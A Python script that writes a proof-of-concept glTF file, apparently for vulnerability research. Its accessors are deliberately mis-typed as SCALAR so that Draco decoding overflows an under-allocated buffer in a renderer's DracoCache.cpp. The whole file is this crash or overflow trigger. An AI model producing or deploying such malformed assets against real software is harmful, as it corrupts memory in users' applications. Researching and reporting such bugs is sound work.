from __future__ import annotations

import json
import shutil
from pathlib import Path


def main() -> int:
    out_dir = Path(__file__).resolve().parent
    out_dir.mkdir(parents=True, exist_ok=True)

    # Use an existing Draco-compressed mesh blob shipped in this repo.
    repo_root = out_dir.parent
    src_bin = repo_root / "third_party/models/FlightHelmet/FlightHelmet.bin"
    if not src_bin.exists():
        raise SystemExit(f"Missing source Draco asset: {src_bin}")

    # Copy only the .bin payload (no textures) and generate a minimal glTF that references it.
    dst_bin = out_dir / "FlightHelmet.bin"
    shutil.copyfile(src_bin, dst_bin)

    # Minimal glTF containing one Draco-compressed primitive.
    #
    # The key corruption is that we intentionally declare the attribute accessors as SCALAR floats
    # even though Draco will decode VEC2/VEC3/VEC4 attributes into them. In release builds (NDEBUG),
    # DracoCache.cpp uses `target->stride * n` for allocation without enforcing that
    # `target->type` / `target->stride` matches the decoded attribute component count.
    gltf = {
        "asset": {"version": "2.0"},
        "extensionsUsed": ["KHR_draco_mesh_compression"],
        "buffers": [
            {
                "uri": "FlightHelmet.bin",
                "byteLength": 501824,
            }
        ],
        "bufferViews": [
            {
                # This corresponds to bufferViews[0] in the original FlightHelmet.gltf.
                "buffer": 0,
                "byteOffset": 0,
                "byteLength": 59806,
            }
        ],
        "accessors": [
            # Indices accessor (kept as-is: USHORT scalar).
            {"componentType": 5123, "count": 24408, "type": "SCALAR"},
            # Attribute accessors: intentionally corrupted to SCALAR float (stride=4).
            {"componentType": 5126, "count": 8468, "type": "SCALAR"},  # TEXCOORD_0 (should be VEC2)
            {"componentType": 5126, "count": 8468, "type": "SCALAR"},  # NORMAL (should be VEC3)
            {"componentType": 5126, "count": 8468, "type": "SCALAR"},  # TANGENT (should be VEC4)
            {"componentType": 5126, "count": 8468, "type": "SCALAR"},  # POSITION (should be VEC3)
        ],
        "meshes": [
            {
                "primitives": [
                    {
                        "attributes": {"TEXCOORD_0": 1, "NORMAL": 2, "TANGENT": 3, "POSITION": 4},
                        "indices": 0,
                        "mode": 4,
                        "extensions": {
                            "KHR_draco_mesh_compression": {
                                "bufferView": 0,
                                "attributes": {"TEXCOORD_0": 0, "NORMAL": 1, "TANGENT": 2, "POSITION": 3},
                            }
                        },
                    }
                ]
            }
        ],
        "nodes": [{"mesh": 0}],
        "scenes": [{"nodes": [0]}],
        "scene": 0,
    }

    out_gltf = out_dir / "poc_draco_stride_underalloc2.gltf"
    out_gltf.write_text(json.dumps(gltf, indent=2) + "\n", encoding="utf-8")

    print(f"Wrote {out_gltf}")
    print(f"Copied {dst_bin}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
